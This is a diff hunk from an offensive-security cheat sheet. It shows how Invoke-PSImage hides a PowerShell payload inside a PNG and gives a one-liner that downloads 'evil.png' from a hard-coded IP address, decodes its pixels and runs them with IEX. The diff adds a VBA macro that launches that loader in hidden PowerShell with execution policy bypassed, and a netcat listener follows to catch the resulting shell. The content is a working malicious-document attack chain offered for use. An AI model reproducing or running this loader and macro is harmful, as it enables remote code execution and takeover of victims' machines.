@@ -16,6 +16,17 @@
 * `Import-Module .\Invoke-PSImage.ps1`
 * `Invoke-PSImage -Script .\payload.ps1 -Out .\evil.png -Image .\image.png -Web`
 * `sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://46.101.222.52/evil.png"));$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..500]))`
+* Create a VBS Macro: 
+```
+Sub RunAndGetCmd()
+
+    strCommand = "Powershell -W Hidden -Exec Bypass -Command ""sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead('http://46.101.222.52/evil.png'));$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..500]))"""
+    Set WshShell = CreateObject("WScript.Shell")
+    Set WshShellExec = WshShell.Exec(strCommand)
+    strOutput = WshShellExec.StdOut.ReadAll
+
+End Sub
+```
 * `nc -nlvp 444`
 
 ## Awsome Tools
